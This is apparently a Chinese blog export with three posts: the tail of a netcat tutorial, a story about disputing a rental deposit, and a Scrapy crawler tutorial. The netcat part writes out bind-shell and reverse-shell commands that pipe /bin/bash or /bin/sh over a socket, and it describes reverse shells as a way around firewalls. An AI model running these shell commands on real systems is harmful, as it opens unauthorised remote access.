以上两个命令会提示需要密码，确保两端使用相同的密码。 这里我们是使用mcrypt用来加密，使用其它任意加密工具都可以。 流视频虽然不是生成流视频的最好方法，但如果服务器上没有特定的工具，使用netcat，我们仍然有希望做成这件事。 这里我们只是从一个视频文件中读入并重定向输出到netcat客户端 Server: $cat video.avi | nc -l 20000 这里我们从socket中读入数据并重定向到mplayer。 Client: $nc 192.168.1.1 20000 | mplayer -vo x11 -cache 3000 - 克隆一个设备如果你已经安装配置一台Linux机器并且需要重复同样的操作对其他的机器，而你不想在重复配置一遍。 不在需要重复配置安装的过程，只启动另一台机器的一些引导可以随身碟和克隆你的机器。 克隆Linux PC很简单，假如你的系统在磁盘/dev/sda上 Server: $dd if=/dev/sda | nc -l 20000 Client: $nc -n 192.168.1.1 20000 | dd of=/dev/sda dd是一个从磁盘读取原始数据的工具，我通过netcat服务器重定向它的输出流到其他机器并且写入到磁盘中，它会随着分区表拷贝所有的信息。 但是如果我们已经做过分区并且只需要克隆root分区，我们可以根据我们系统root分区的位置，更改sda 为sda1，sda2.等等。 打开一个shell假设你的netcat支持 -c -e 参数(原生 netcat) Server: $nc -l 20000 -e /bin/bash -i Client: $nc 192.168.1.1 20000 这里我们已经创建了一个netcat服务器并且表示当它连接成功时执行/bin/bash 假如netcat 不支持-c 或者 -e 参数（openbsd netcat）,我们仍然能够创建远程shell Server: $mkfifo /tmp/tmp_fifo $cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 20000 &gt; /tmp/tmp_fifo 这里我们创建了一个fifo文件，然后使用管道命令把这个fifo文件内容定向到shell 2&gt;&amp;1中。 2&gt;&amp;1是用来重定向标准错误输出和标准输出，然后管道到netcat 运行的端口20000上。至此，我们已经把netcat的输出重定向到fifo文件中。 说明： 从网络收到的输入写到fifo文件中 cat 命令读取fifo文件并且其内容发送给sh命令 sh命令进程受到输入并把它写回到netcat。 netcat 通过网络发送输出到client 至于为什么会成功是因为管道使命令平行执行，fifo文件用来替代正常文件，因为fifo使读取等待而如果是一个普通文件，cat命令会尽快结束并开始读取空文件。 在客户端仅仅简单连接到服务器 Client: $nc -n 192.168.1.1 20000 你会得到一个shell提示符在客户端 反向shell反向shell是指在客户端打开的shell。反向shell这样命名是因为不同于其他配置，这里服务器使用的是由客户提供的服务。 Server: $nc -l 20000 在客户端，简单地告诉netcat在连接完成后，执行shell。 Client: $nc 192.168.1.1 20000 -e /bin/bash 现在，什么是反向shell的特别之处呢 反向shell经常被用来绕过防火墙的限制，如阻止入站连接。 例如，我有一个专用IP地址为192.168.1.1，我使用代理服务器连接到外部网络。如果我想从网络外部访问 这台机器如1.2.3.4的shell，那么我会用反向外壳用于这一目的。 #### 指定源端口假设你的防火墙过滤除25端口外其它所有端口，你需要使用-p选项指定源端口。Server：$nc -l 20000Client：$nc 192.168.1.1 20000 25使用1024以内的端口需要root权限。 该命令将在客户端开启25端口用于通讯，否则将使用随机端口。 指定源地址假设你的机器有多个地址，希望明确指定使用哪个地址用于外部数据通讯。我们可以在netcat中使用-s选项指定ip地址。 Server: $nc -u -l 20000 &lt; file.txt Client: $nc -u 192.168.1.1 20000 -s 172.31.100.5 &gt; file.txt 该命令将绑定地址172.31.100.5。 静态web页面服务器新建一个网页,命名为somepage.html; 新建一个shell script: while true; do nc -l 80 -q 1 &lt; somepage.html; done 用root权限执行，然后在浏览器中输入127.0.0.1打开看看是否正确运行。 nc 指令通常都是给管理者进行除错或测试等作用的，所以如果只是单纯需要临时的网页服务器，使用 Python 的 SimpleHTTPServer 组会比较方便。 模拟HTTP Headers$nc www.huanxiangwu.com 80 GET / HTTP/1.1 Host: ispconfig.org Referrer: mypage.com User-Agent: my-browser HTTP/1.1 200 OK Date: Tue, 16 Dec 2008 07:23:24 GMT Server: Apache/2.2.6 (Unix) DAV/2 mod_mono/1.2.1 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8 Set-Cookie: PHPSESSID=bbadorbvie1gn037iih6lrdg50; path=/ Expires: 0 Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Cache-Control: private, post-check=0, pre-check=0, max-age=0 Set-Cookie: oWn_sid=xRutAY; expires=Tue, 23-Dec-2008 07:23:24 GMT; path=/ Vary: Accept-Encoding Transfer-Encoding: chunked Content-Type: text/html [......] 在nc命令后，输入红色部分的内容(命令下方的4行内容)，然后按两次回车，即可从对方获得HTTP Headers内容。 Netcat支持IPv6netcat 的 -4 和 -6 参数用来指定 IP 地址类型，分别是 IPv4 和 IPv6： Server: $ nc -4 -l 2389 Client: $ nc -4 localhost 2389 然后我们可以使用 netstat 命令来查看网络的情况： $ netstat | grep 2389 tcp 0 0 localhost:2389 localhost:50851 ESTABLISHED tcp 0 0 localhost:50851 localhost:2389 ESTABLISHED 接下来我们看看IPv6 的情况： Server: $ nc -6 -l 2389 Client: $ nc -6 localhost 2389 再次运行 netstat 命令： $ netstat | grep 2389 tcp6 0 0 localhost:2389 localhost:33234 ESTABLISHED tcp6 0 0 localhost:33234 localhost:2389 ESTABLISHED 前缀是 tcp6 表示使用的是 IPv6 的地址。 在 Netcat 中禁止从标准输入中读取数据该功能使用 -d 参数，请看下面例子： Server: $ nc -l 2389 Client: $ nc -d localhost 2389 Hi 你输入的 Hi 文本并不会送到服务器端 强制 Netcat 服务器端保持启动状态如果连接到服务器的客户端断开连接，那么服务器端也会跟着退出。 Server: $ nc -l 2389 Client: $ nc localhost 2389 ^C Server: $ nc -l 2389 上述例子中，但客户端断开时服务器端也立即退出。 我们可以通过 -k 参数来控制让服务器不会因为客户端的断开连接而退出。 Server: $ nc -k -l 2389 Client: $ nc localhost 2389 ^C Server: $ nc -k -l 2389 配置 Netcat 客户端不会因为 EOF 而退出Netcat 客户端可以通过 -q 参数来控制接收到 EOF 后隔多长时间才退出，该参数的单位是秒： Client: $nc -q 5 localhost 2389 现在如果客户端接收到 EOF ，它将等待 5 秒后退出。 手动使用 SMTP 协议寄信在测试邮件服务器是否正常时，可以使用这样的方式手动发送 Email： $nc localhost 25 &lt;&lt; EOF HELO host.example.com MAIL FROM: &lt;user@host.example.com&gt; RCPT TO: &lt;user2@host.example.com&gt; DATA Body of email. . QUIT EOF 透过代理服务器（Proxy）连线这指令会使用 10.2.3.4:8080 这个代理服务器，连线至 host.example.com 的42端口。 $nc -x10.2.3.4:8080 -Xconnect host.example.com 42 使用 Unix Domain Socket这行指令会建立一个 Unix Domain Socket，并接收资料： $nc -lU /var/tmp/dsocket]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>nc</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[与房屋中介公司要押金的斗智斗勇]]></title>
    <url>%2F2019%2F12%2F31%2F%E4%B8%8E%E6%88%BF%E5%B1%8B%E4%B8%AD%E4%BB%8B%E5%85%AC%E5%8F%B8%E8%A6%81%E6%8A%BC%E9%87%91%E7%9A%84%E6%96%97%E6%99%BA%E6%96%97%E5%8B%87%2F</url>
    <content type="text"><![CDATA[我是在2017年3月15号开始入住到福元路玉凤路战友苑小区南区的，签了一年的合同，当时还是纸质版的合同，这一年结交了几位朋友，其余没啥说的，直接略过。进入到2018年，租房快到期了，我又续费一年，这一年就没有纸质合同了，而是电子合同，支付宝蘑菇租房的那种，在线查看合同租约，在线缴费等。合同上写明的有每次缴费的日期和金额。费用呢，房租还是跟上一年的一样，押一付三，物业费一次性交一年，还有水电燃气押金200元。教训第一条：物业费：不同的小区物业费不一样，我这个租的物业费TTMD的贵了，一年730元。后来我换地方租，也就是我现在租的这个，一年的物业费合计396元，相差334元。租房子的时候物业费这个一定要货比三家。因2017年的租户租期到了陆续都搬走了，新搬进来其他租户，我就自发的让新租户加入微信群，快到缴费的时候就组织大家合计缴费，但是事情发生了，部分租户对费用分摊有很大抵触，各种刁难，有时联系不上，有时联系上了故意拖延转账，耽误了缴费的时间，导致被强行断电，我租住了第一次缴费，实在厌恶这样的，索性懒得管，爱咋地咋地，以后就不管缴费这事儿了。后来由中介那边助理负责这件事儿，每次到缴费的时候就在群里大声疾呼，但是还是会出现强行断电的情况。关于停电，有以下两种情况：因欠物业费而停电租户把物业费交给中介，中介再把物业费交给小区的物业管理中心，当屋内房间没有租完时，中介有时会不交物业费给物业管理中心，等有人租房子交了物业费中介公司再把物业费给物业管理中心，这中间的时间间隔一长，就会发生物业管理中心因中介未交物业费而强行给房间断电的情况。因欠电费而停电2017年的缴费是租户在微信群里自发组织在支付宝里缴费的，大家相处的也很融洽，临走时还海底捞聚餐来着。从未发生过因欠电费、水费或燃气费而被物业管理中心强行停电的情况，2018年则恰恰相反。教训第二条：水电和燃气费：现在这些费用都可以通过户号在支付宝里缴纳，水电和燃气的缴纳户号都不一样，具体可以问物业管理中心。这个缴费一定要跟其他租户提前商量好由租户负责，天知道中介助理哪天脑袋抽筋忘了这茬事儿，最主要的是助理摆不平那些刁难的租户。我现在租的这个房子，水电和燃气各每天一块钱，合计三者每月90元，然后就随便用。注意这个电是指公用的用电，比如走廊、厨房，卫生间等用电。每个房间内有单独的一个电表，还有一个总电表。这样一来，费用这个就很好计算，也不会出现费用分摊不合理的情况。延伸一下：之前租的房间内有一个老旧的中央空调，到夏天的时候，关于是否用这个空调的问题也产生过激烈的争斗。这空调不仅制冷效果不好，还很费电。因部分租户上夜班，这就使空调的使用颇费周折。结果导致空调白天黑夜连轴转，因制冷效果不好，温度还调的很低，导致用电量大大大大增。然后就因电费分摊这个互相扯皮。教训第三条：关于房间内的公用设施，比如空凋，洗衣机等，尤其是空调这个电老虎，或者不用，或者不租这类的房子。我现在租的这个，每个房间有一个电表，还有一个总电表，这样一来就把公用电和每个房间的用电给分隔开了。谁想用空调谁自己安装，电费自己缴纳，跟其他费用都不掺和。说的有点多了，话题扯的有点远，接下来继续说正事儿。房租不是快到期了么，就以上情况，都不想再续租了，提前好几天就跟中介公司联系，让他们过来验收一下房屋，给我尽快办理退房手续。连续三天放我鸽子，明明白天说好了，说是晚上几点几点过来验收办理退房手续，可到点了人没来，也没给我打电话，我直接打电话过去，对方不是说忙，就是说在开会，我当时就有点生气，来不了怎么不打电话或发微信说一声。经历过这件事儿，彻底对这个中介公司很失望，当时心里想着赶紧办完这个事儿，不想跟这样的公司员工打交道。终于到房租到期的那一天他们来了，验收一下房屋情况，写了一个费用清单，写了三项，房间卫生，厨房卫生和床板断裂。然后又让我直接在下面写上我的银行账户，签上字。我问他们，说是房间卫生要扣多少，厨房卫生要扣多少，他们不说，只说放心吧，这费用扣的很少。我又问啥时候能把押金给退回来，他们说十五天之内。我把房间钥匙交给他们就走了。心想总算交接完了，接下来等着对方退还押金就是了。教训第四条：关于退房验收这个，凡是需要扣款的地方一定要详细的问清楚，比如房屋打扫费用要扣多少，断裂一个床板要扣多少，这个他们肯定知道，不给你的话这里面肯定有他们的阴谋。接下来的事情坏就坏在自己想的太想当然了。十五天的截止日期快到了，我跟中介助理联系，说是快到期了，押金啥时候退还，他说还有个水费没有结算，让再等几天。没办法，钱在别人手里，别人就是大爷，我只能耐心等了。每天催促他们去抄水表，每次我问都有不同的回复，有一次是有个车压着水表井盖了，还得等等。有一次是抄错水表了，还得再去一趟。看样子目前就卡在水费这一块儿了。令我很不解的是都是我主动联系他们那边，问啥情况他们才说，有啥新情况从不主动跟我打电话说。公司就恁穷么，连个电话都舍不得打。。。这个难产的水费终于计算出来了，问中介助理啥时候退押金，他说卡在他们总监那边了，他这边处理不了，得，我直接找他总监联系。此时已经进入4月份了，我是3月15号退的房，说好的15天之内退押金这都已经超好几天了。跟他们总监联系的时候我当时正在南阳出差，让他把费用清单发过来，按他这清单的费用情况，我那押金不仅一分都要不过来，相反还要倒贴他们部分费用。是可忍孰不可忍，立马就开始跟他怼起来了。房间打扫费用扣50，我认了；厨房打扫费用扣50，我也认了；马桶维修费是啥，当时验收的时候明明没这个的，他们竟私自加上去也不跟我说一声，当时就表明这个费用我不认；断裂了一块床板扣200，我一问才知道，他们说断裂一块床板直接给新换一个床，TMD，还得这样处理的，床板我自己都能换，用得着换新的么；重头戏还在后面，还要扣我两天的滞纳金，说是我有一次晚交几天房租，我当时就很纳闷，我这么一个诚实守信的人，做事情都是有时间计划的，绝不可能出现晚交房租的情况，他还理直气壮的说看合同，看合同，按合同办事。。。出现这种情况看来跟我当时退房时的那种想当然的结果有很大差距我当时在南阳出差，不能因为这个分心，当时就决定这件事儿先放一放，等我出差的事儿办好回郑州之后再慢慢梳理。回郑州后我仔细查看合同，终于发现这其中的关窍所在了。对方想的是：我是15号租的房子，按理说应该是到第三个月的15号交下三个月的房租，我有一次是在17号交的房租，其余三次都是在15号交的房租。晚交两天理应要扣滞纳金。可合同很打脸，合同中明明写的有我每次需要交房租的具体时间，都是17号，从来没有15号这一说，我那三次15号交的还是提前两天交的呢。撇开这个不说，假如就算我应该在15号交房租，可是违约责任中写的也很清楚，若超过交租日期，贰日内仍不缴纳的，才算我违约。TDYD，给我口口声声说看合同，按合同办事儿，你都没看合同还好意思这样说。等我把合同截图给他发过去，尤其是给他注明交租日期和违约责任条款时，就不信你不认。终于这个滞纳金不扣了。不过查看合同我才发现，合同中有一个不足之处，违约责任中只说明对租户违约责任的处罚，对他们违约责任的处罚则没有。这一点尤其要注意，就算把他们告上法庭，合同中并没有对他们的违约处罚，究竟要如何处罚他们估计仍免不了一份唇枪舌剑。这个考虑也是我后来妥协的原因，因为这件事儿我耽搁的时间太多了，他们的时间不珍惜，我得珍惜我的时间才行。教训第五条：租房子之前已经要看请合同内容，看仔细合同内容，看明白合同内容。就算后期维权也是以这个合同为准，当时的口头协议就怕到时候他们翻脸不认。维修马桶费用不扣了，滞纳金费用不扣了，还剩一个断裂的床板儿，床板断裂一块儿，我是应该赔偿的，可是用得着直接赔一个新床么，就算要赔一个新床，最起码也得跟我打电话说一声吧，可是没给我打电话。然后问他新床是谁换的，有收据没，对方也不提供，只说你损坏了你就得赔偿，后面的用不着你管，你只管赔偿就行。我反问拖欠我恁长时间押金不退换你们咋赔偿，哑巴了吧。。懒得再跟他们扯皮了，我浪费不起这就时间， 这个费用我认了，也认栽了。商量好应该退还的剩余费用后，说好是两天之内退还到我账户，那我就没啥可说的了，等待到账就行了。可是我想的还是太单纯了，两天之内的第二天我快下班的时候还没到账，再次一个电话打过去，对方说这几天财务休息，没法转账。没发转账你倒是给我打电话说呀，我不主动打电话问就啥都不说。正好那一天的明天我休息，正好到他们公司去要账去。接待我的是另一个，问了情况之后说是他今天下午6点之前一定转账，若不转账明天再过来直接给你现金。我给他说要留一下他的手机号，他还让我联系之前那一个人，呵呵。。。我还特意上网搜索了一下这个中介公司，一查不得了，2019年还没过几个月呢，都已经被告上多次了。百度贴吧郑州吧截图教训第六条：当自己的合法权益收到侵害时，不要退缩，要勇于站出来跟他们抗争，据礼以搏，就算结果不怎么如意，最起码心里出了这口气，也不能让他们过的太安生。。。]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrapy学习]]></title>
    <url>%2F2019%2F12%2F31%2Fscrapy%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[scrapy是什么Scrapy 是用 Python 实现的一个为了爬取网站数据、提取结构性数据而编写的应用框架。常应用在包括数据挖掘，信息处理或存储历史数据等一系列的程序中。通常我们可以很简单的通过 Scrapy 框架实现一个爬虫，抓取指定网站的内容或图片。 scrapy架构图绿线是数据流向 Scrapy Engine(引擎): 负责Spider、ItemPipeline、Downloader、Scheduler中间的通讯，信号、数据传递等。 Scheduler(调度器): 它负责接受引擎发送过来的Request请求，并按照一定的方式进行整理排列，入队，当引擎需要时，交还给引擎。 Downloader（下载器）：负责下载Scrapy Engine(引擎)发送的所有Requests请求，并将其获取到的Responses交还给Scrapy Engine(引擎)，由引擎交给Spider来处理， Spider（爬虫）：它负责处理所有Responses,从中分析提取数据，获取Item字段需要的数据，并将需要跟进的URL提交给引擎，再次进入Scheduler(调度器). Item Pipeline(管道)：它负责处理Spider中获取到的Item，并进行进行后期处理（详细分析、过滤、存储等）的地方。 Downloader Middlewares（下载中间件）：你可以当作是一个可以自定义扩展下载功能的组件。 Spider Middlewares（Spider中间件）：你可以理解为是一个可以自定扩展和操作引擎和Spider中间通信的功能组件（比如进入Spider的Responses;和从Spider出去的Requests） 注意！只有当调度器中不存在任何request了，整个程序才会停止，（也就是说，对于下载失败的URL，Scrapy也会重新下载。） 制作 Scrapy 爬虫 一共需要4步： 新建项目 (scrapy startproject xxx)：新建一个新的爬虫项目 明确目标 （编写items.py）：明确你想要抓取的目标 制作爬虫 （spiders/xxspider.py）：制作爬虫开始爬取网页 存储内容 （pipelines.py）：设计管道存储爬取内容 scrapy安装1. 如果你用的是Anaconda或者Minconda，可以使用下面的命令：conda install -c conda-forge scrapy 2. 如果你已经安装了python包管理工具PyPI，可以使用下面命令进行安装：pip install Scrapy。值得注意的是，如果你使用的是pip安装，你需要解决相应的包依赖。 scrapy依赖的一些包： lxml：一种高效的XML和HTML解析器， PARSEL：一个HTML / XML数据提取库，基于上面的lxml， w3lib：一种处理URL和网页编码多功能辅助 twisted,：一个异步网络框架 cryptography and pyOpenSSL，处理各种网络级安全需求 以上包需要的最低版本： Twisted 14.0 lxml 3.4 pyOpenSSL 0.14 常见依赖问题: 1.错误提示：ModuleNotFoundError: No module named &apos;win32api&apos; 解决方法： (1)到这个网站下载跟使用的Python版本相匹配的软件：https://github.com/mhammond/pywin32/releases (2)进入使用的Python解释器里的Scripts目录，里面有一个easy_install.exe文件 (3)打开命令行，使用如下命令进行安装：easy_install.exe pywin32-224.win-amd64-py3.6.exe 2.错误提示：building &apos;twisted.test.raiser&apos; extension 解决方法： (1)到这个网站下载跟使用的Python版本相匹配的软件：https://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted (2)进入使用的Python解释器里的Scripts目录，里面有一个pip.exe文件 (3)打开命令行，使用如下命令进行安装：pip.exe Twisted-18.9.0-cp36-cp36m-win_amd64.whl win7安装scrapy推荐使用Anaconda进行安装 CentOS 7安装scrapyCentOS 7系统自带的python版本是2.7，若是python3.5+版本，则不用再安装pip了。 (1)安装pip # yum -y install epel-release # yum install python-pip # pip install --upgrade pip (2)安装依赖包 # yum install gcc libffi-devel python-devel openssl-devel -y (3)安装scrapy # pip install scrapy scrapy入门新建项目在开始爬取之前，首先要创建一个scrapy项目，在命令行输入一下命令即可创建: # scrapy startproject mySpider scrapy startproject是固定写法，注意scrapy和startproject和mySpider中间是有空格的！ mySpider 为项目名称，可以看到将会创建一个 mySpider 文件夹，目录结构大致如下： mySpider/ scrapy.cfg mySpider/ __init__.py items.py pipelines.py settings.py spiders/ __init__.py ...... 这些文件分别是: scrapy.cfg: 项目的配置文件。 mySpider/: 项目的Python模块，将会从这里引用代码。 mySpider/items.py: 项目的目标文件。 mySpider/pipelines.py: 项目的管道文件。 mySpider/settings.py: 项目的设置文件。 mySpider/spiders/: 存储爬虫代码目录。 明确目标打开 mySpider 目录下的 items.py， Item 定义结构化数据字段，用来保存爬取到的数据，有点像 Python 中的 dict，但是提供了一些额外的保护减少错误。 可以通过创建一个 scrapy.Item 类， 并且定义类型为 scrapy.Field 的类属性来定义一个 Item（可以理解成类似于 ORM 的映射关系）。 创建一个 ItcastItem 类，和构建 item 模型（model）： import scrapy class ItcastItem(scrapy.Item): name = scrapy.Field() title = scrapy.Field() info = scrapy.Field() 制作爬虫命令：scrapy genspider mingyan2 mingyan2.com mingyan2为蜘蛛名，mingyan2.com为要爬取的网站地址 运行蜘蛛命令：scrapy crawl mingyan2 要重点提醒一下，我们一定要进入：mingyan 这个目录，也就是我们创建的蜘蛛项目目录，以上命令才有效！还有 crawl 后面跟的mingyan2是你类里面定义的蜘蛛名，也就是：name，并不是项目名、也不是类名。 scrapy start_url（初始链接）的两种不同写法第一种： start_urls = [ # 另外一种写法，无需定义start_requests方法 &apos;http://lab.scrapyd.cn/page/1/&apos;, &apos;http://lab.scrapyd.cn/page/2/&apos;, ]， 必须定义一个方法为：def parse(self, response)，方法名一定是：parse 第二种： 自己定义一个start_requests()方法 示例代码： &quot;&quot;&quot; scrapy初始Url的两种写法， 一种是常量start_urls，并且需要定义一个方法parse（） 另一种是直接定义一个方法：star_requests() &quot;&quot;&quot; import scrapy class simpleUrl(scrapy.Spider): name = &quot;simpleUrl&quot; start_urls = [ #另外一种写法，无需定义start_requests方法 &apos;http://lab.scrapyd.cn/page/1/&apos;, &apos;http://lab.scrapyd.cn/page/2/&apos;, ] # 另外一种初始链接写法 # def start_requests(self): # urls = [ #爬取的链接由此方法通过下面链接爬取页面 # &apos;http://lab.scrapyd.cn/page/1/&apos;, # &apos;http://lab.scrapyd.cn/page/2/&apos;, # ] # for url in urls: # yield scrapy.Request(url=url, callback=self.parse) # 如果是简写初始url，此方法名必须为：parse def parse(self, response): page = response.url.split(&quot;/&quot;)[-2] filename = &apos;mingyan-%s.html&apos; % page with open(filename, &apos;wb&apos;) as f: f.write(response.body) self.log(&apos;保存文件: %s&apos; % filename) scrapy调试工具：scrapy shell使用方法进入scrapy shell调试命令：scrapy shell http://lab.scrapyd.cn scrapy shell 是固定格式，后面跟的是你要调试的页面。这段代码就是一个下载的过程，一执行这么一段代码scrapy就立马把我们相应链接的相应页面给拿到了 scrapy css选择器使用进入scrapy shell调试命令：scrapy shell http://lab.scrapyd.cn 在命令行输入如下命令： &gt;&gt;&gt; response.css(&apos;title&apos;) [&lt;Selector xpath=&apos;descendant-or-self::title&apos; data=&apos;&lt;title&gt;SCRAPY爬虫实验室 - SCRAPY中文网提供&lt;/title&gt;&apos;&gt;] 使用这个命令提取的一个Selector的列表，并不是我们想要的数据；那我们再使用scrapy给我们准备的一些函数来进一步提取，那我们改变一下上面的写法， &gt;&gt;&gt; response.css(&apos;title&apos;).extract() [&apos;&lt;title&gt;SCRAPY爬虫实验室 - SCRAPY中文网提供&lt;/title&gt;&apos;] 我们只是在后面加入了：extract() 这么一个函数你就提取到了我们标签的一个列表，更近一步了，那如果我们不要列表，只要title这个标签，要怎么处理呢，看我们的输入： &gt;&gt;&gt; response.css(&apos;title&apos;).extract()[0] &apos;&lt;title&gt;爬虫实验室 - SCRAPY中文网提供&lt;/title&gt;&apos; 这里的话，我们只需要在后面添加：[0]，那代表提取这个列表中的第一个元素，那就得到了我们的title字符串；这里的话scrapy也给我提供了另外一个函数，可以这样来写，一样的效果： &gt;&gt;&gt; response.css(&apos;title&apos;).extract_first() &apos;&lt;title&gt;爬虫实验室 - SCRAPY中文网提供&lt;/title&gt;&apos; extract_first()就代表提取第一个元素，和我们的：[0]，一样的效果，只是更简洁些， 至此我们已经成功提取到了我们的title，但是你会发现，肿么多了一个title标签，这并不是你需要的，那要肿么办呢， 我们可以继续改变一下以上的输入： &gt;&gt;&gt; response.css(&apos;title::text&apos;).extract_first() &apos;爬虫实验室 - SCRAPY中文网提供&apos; 在title后面加上了 ::text ,这代表提取标签里面的数据，至此，我们已经成功提取到了我们需要的数据： &apos;爬虫实验室 - SCRAPY中文网提供&apos; 总结一下，其实就这么一段代码： response.css(&apos;title::text&apos;).extract_first() scrapy提取一组数据class选择器使用的是&quot;.&quot;,比如.text ，如果是id选择器的话：使用&quot;#&quot;,比如 #text 示例代码： import scrapy class itemSpider(scrapy.Spider): name = &apos;itemSpider&apos; start_urls = [&apos;http://lab.scrapyd.cn&apos;] def parse(self, response): mingyan = response.css(&apos;div.quote&apos;)[0] text = mingyan.css(&apos;.text::text&apos;).extract_first() # 提取名言 autor = mingyan.css(&apos;.author::text&apos;).extract_first() # 提取作者 tags = mingyan.css(&apos;.tags .tag::text&apos;).extract() # 提取标签 tags = &apos;,&apos;.join(tags) # 数组转换为字符串 fileName = &apos;%s-语录.txt&apos; % autor # 爬取的内容存入文件，文件名为：作者-语录.txt f = open(fileName, &quot;a+&quot;) # 追加写入文件 f.write(text) # 写入名言内容 f.write(&apos;\n&apos;) # 换行 f.write(&apos;标签：&apos;+tags) # 写入标签 f.close() # 关闭文件操作 scrapy 爬取多条数据这次比上次唯一多了个递归调用，我们来看一下关键变化，原先我们取出一条数据，用的是如下表达式：mingyan = response.css(&apos;div.quote&apos;)[0] 我们在后面添加了游标 [0] 表示只取出第一条，那我们要取出全部，那我们就不用加了，直接：mingyan = response.css(&apos;div.quote&apos;) 那现在的变量就是一个数据集，里面有多条数据了，那接下来我们要做的就是循环取出数据集里面的每一条数据，那我们看一下怎么做： mingyan = response.css(&apos;div.quote&apos;) # 提取首页所有名言，保存至变量mingyan for v in mingyan: # 循环获取每一条名言里面的：名言内容、作者、标签 text = v.css(&apos;.text::text&apos;).extract_first() # 提取名言 autor = v.css(&apos;.author::text&apos;).extract_first() # 提取作者 tags = v.css(&apos;.tags .tag::text&apos;).extract() # 提取标签 tags = &apos;,&apos;.join(tags) # 数组转换为字符串 # 接下来，进行保存 可以看到，关键是：for v in mingyan: 表示把 mingyan 这个数据集里面的数据，循环赋值给：v ，第一次循环的话 v 就代表第一条数据， 那text = v.css(&apos;.text::text&apos;).extract_first() 就代表第一条数据的名言内容，以此类推，把所有数据都取了出来，最终进行保存，我们看一下完整的代码： import scrapy class itemSpider(scrapy.Spider): name = &apos;listSpider&apos; start_urls = [&apos;http://lab.scrapyd.cn&apos;] def parse(self, response): mingyan = response.css(&apos;div.quote&apos;) # 提取首页所有名言，保存至变量mingyan for v in mingyan: # 循环获取每一条名言里面的：名言内容、作者、标签 text = v.css(&apos;.text::text&apos;).extract_first() # 提取名言 autor = v.css(&apos;.author::text&apos;).extract_first() # 提取作者 tags = v.css(&apos;.tags .tag::text&apos;).extract() # 提取标签 tags = &apos;,&apos;.join(tags) # 数组转换为字符串 &quot;&quot;&quot; 接下来进行写文件操作，每个名人的名言储存在一个txt文档里面 &quot;&quot;&quot; fileName = &apos;%s-语录.txt&apos; % autor # 定义文件名,如：木心-语录.txt with open(fileName, &quot;a+&quot;) as f: # 不同人的名言保存在不同的txt文档，“a+”以追加的形式 f.write(text) f.write(&apos;\n&apos;) # ‘\n’ 表示换行 f.write(&apos;标签：&apos; + tags) f.write(&apos;\n-------\n&apos;) f.close() scrapy 爬取下一页要爬取下一页，那我们首先要分析链接格式，找到下一页的链接，那爬取就简单了。下一页的链接如下： &lt;li class=&quot;next&quot;&gt; &lt;a href=&quot;http://lab.scrapyd.cn/page/2/&quot;&gt;下一页 »&lt;/a&gt; &lt;/li&gt; 每爬一页就用css选择器来查询，是否存在下一页链接，存在：则爬取下一页链接：http://lab.scrapyd.cn/page/*/， 然后把下一页链接提交给当前爬取的函数，继续爬取，继续查找下一页，知道找不到下一页，说明所有页面已经爬完，那结束爬虫。 爬取内容的代码和上一文档（listSpider）一模一样，唯一区别的是这么一个地方，我们在：listSpider 蜘蛛下面添加了这么几段代码： next_page = response.css(&apos;li.next a::attr(href)&apos;).extract_first() if next_page is not None: next_page = response.urljoin(next_page) yield scrapy.Request(next_page, callback=self.parse) 首先：我们使用：response.css(&apos;li.next a::attr(href)&apos;).extract_first()查看有木有存在下一页链接，如果存在的话，我们使用：urljoin(next_page)把相对路径，如：page/1转换为绝对路径，其实也就是加上网站域名，如：http://lab.scrapyd.cn/page/1； 接下来就是爬取下一页或是内容页的秘诀所在，scrapy给我们提供了这么一个方法：scrapy.Request() 这个方法还有许多参数，后面我们慢慢说，这里我们只使用了两个参数，一个是：我们继续爬取的链接（next_page）， 这里是下一页链接，当然也可以是内容页；另一个是：我们要把链接提交给哪一个函数爬取，这里是parse函数，也就是本函数； 当然，我们也可以在下面另写一个函数，比如：内容页，专门处理内容页的数据。 经过这么一个函数，下一页链接又提交给了parse，那就可以不断的爬取了，直到不存在下一页； scrapy arguments：指定蜘蛛参数爬取scrapy提供了可传参的爬虫，首先按scrapy 参数格式定义好参数，如下： def start_requests(self): url = &apos;http://lab.scrapyd.cn/&apos; tag = getattr(self, &apos;tag&apos;, None) # 获取tag值，也就是爬取时传过来的参数 if tag is not None: # 判断是否存在tag，若存在，重新构造url url = url + &apos;tag/&apos; + tag # 构造url若tag=爱情，url= &quot;http://lab.scrapyd.cn/tag/爱情&quot; yield scrapy.Request(url, self.parse) # 发送请求爬取参数内容 可以看到 tag = getattr(self, &apos;tag&apos;, None) 就是获取传过来的参数，然后根据不同的参数，构造不同的url，然后进行不同的爬取，经过这么一个处理，我们的蜘蛛就灰常的灵活了，我们来看一下完整代码： # -*- coding: utf-8 -*- import scrapy class ArgsspiderSpider(scrapy.Spider): name = &quot;argsSpider&quot; def start_requests(self): url = &apos;http://lab.scrapyd.cn/&apos; tag = getattr(self, &apos;tag&apos;, None) # 获取tag值，也就是爬取时传过来的参数 if tag is not None: # 判断是否存在tag，若存在，重新构造url url = url + &apos;tag/&apos; + tag # 构造url若tag=爱情，url= &quot;http://lab.scrapyd.cn/tag/爱情&quot; yield scrapy.Request(url, self.parse) # 发送请求爬取参数内容 &quot;&quot;&quot; 以下内容为上一讲知识，若不清楚具体细节，请查看上一讲！ &quot;&quot;&quot; def parse(self, response): mingyan = response.css(&apos;div.quote&apos;) for v in mingyan: text = v.css(&apos;.text::text&apos;).extract_first() tags = v.css(&apos;.tags .tag::text&apos;).extract() tags = &apos;,&apos;.join(tags) fileName = &apos;%s-语录.txt&apos; % tags with open(fileName, &quot;a+&quot;) as f: f.write(text) f.write(&apos;\n&apos;) f.write(&apos;标签：&apos; + tags) f.write(&apos;\n-------\n&apos;) f.close() next_page = response.css(&apos;li.next a::attr(href)&apos;).extract_first() if next_page is not None: next_page = response.urljoin(next_page) yield scrapy.Request(next_page, callback=self.parse) 要如何传参,可以这样：scrapy crawl argsSpider -a tag=爱情 